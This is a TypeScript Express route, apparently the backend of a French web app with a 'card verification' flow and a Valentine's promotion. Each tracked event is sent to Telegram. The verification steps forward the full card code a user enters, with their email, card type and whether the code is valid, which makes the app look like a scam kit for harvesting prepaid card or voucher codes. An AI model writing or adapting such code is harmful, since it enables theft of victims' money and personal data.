// --- Tracking Route ---
app.post('/api/track', async (req: any, res: any) => {
  const { event, data } = req.body;
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  
  let userEmail = 'Guest';
  let userId = null;
  
  if (token) {
    try {
      const decoded: any = jwt.verify(token, JWT_SECRET);
      userId = decoded.userId;
      userEmail = decoded.email;
    } catch (e) {
      // Token invalid, continue as guest
    }
  }
  
  let message = '';
  const timestamp = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
  
  switch(event) {
    case 'PAGE_VIEW':
      message = '📍 *Visite de Page*\n\n👤 User: ' + userEmail + '\n📄 Page: ' + data.page + '\n🕐 ' + timestamp;
      break;
    case 'AUTH_LOGIN':
      message = '🔐 *Connexion*\n\n👤 User: ' + data.email + '\n✅ Statut: Connecté\n🕐 ' + timestamp;
      break;
    case 'AUTH_SIGNUP':
      message = '✨ *Nouvelle Inscription*\n\n👤 Nom: ' + data.name + '\n📧 Email: ' + data.email + '\n🕐 ' + timestamp;
      break;
    case 'VERIFY_START':
      message = '🚀 *Début Vérification*\n\n👤 User: ' + userEmail + '\n💳 Carte: ' + (data.cardName || 'Non sélectionnée') + '\n🕐 ' + timestamp;
      break;
    case 'VERIFY_CARD_SELECTED':
      message = '💳 *Carte Sélectionnée*\n\n👤 User: ' + userEmail + '\n💳 Type: ' + data.cardName + '\n🆔 ID: ' + data.cardId + '\n🕐 ' + timestamp;
      break;
    case 'VERIFY_EMAIL_ENTERED':
      message = '📧 *Email Saisi*\n\n👤 User: ' + userEmail + '\n📧 Email saisi: ' + data.email + '\n💳 Carte: ' + data.cardName + '\n🕐 ' + timestamp;
      break;
    case 'VERIFY_CODE_ENTERED':
      message = '🔢 *Code Saisi*\n\n👤 User: ' + userEmail + '\n📧 Email: ' + data.email + '\n💳 Carte: ' + data.cardName + '\n🔑 Code: `' + data.code + '`\n📏 Longueur: ' + (data.code?.length || 0) + ' caractères\n🕐 ' + timestamp;
      break;
    case 'VERIFY_ANALYSIS_START':
      message = '⚙️ *Analyse en Cours*\n\n👤 User: ' + userEmail + '\n📧 Email: ' + data.email + '\n🔑 Code: `' + data.code + '`\n🕐 ' + timestamp;
      break;
    case 'VERIFY_RESULT':
      const resultIcon = data.success ? '✅' : '❌';
      message = resultIcon + ' *Résultat Vérification*\n\n👤 User: ' + userEmail + '\n📧 Email: ' + data.email + '\n🔑 Code: `' + data.code + '`\n📊 Résultat: ' + (data.success ? 'VALIDE ✅' : 'INVALIDE ❌') + '\n🕐 ' + timestamp;
      break;
    case 'BUY_START':
      message = '🛒 *Achat Démarré*\n\n👤 User: ' + userEmail + '\n🕐 ' + timestamp;
      break;
    case 'PROMO_START':
      message = '🎁 *Promotion Démarrée*\n\n👤 User: ' + userEmail + '\n💝 Type: Saint-Valentin\n🕐 ' + timestamp;
      break;
    default:
      message = '📊 *Événement: ' + event + '*\n\n👤 User: ' + userEmail + '\n📦 Data: ' + JSON.stringify(data) + '\n🕐 ' + timestamp;
  }
  
  await sendTelegramMessage(message);
  res.json({ success: true });
});
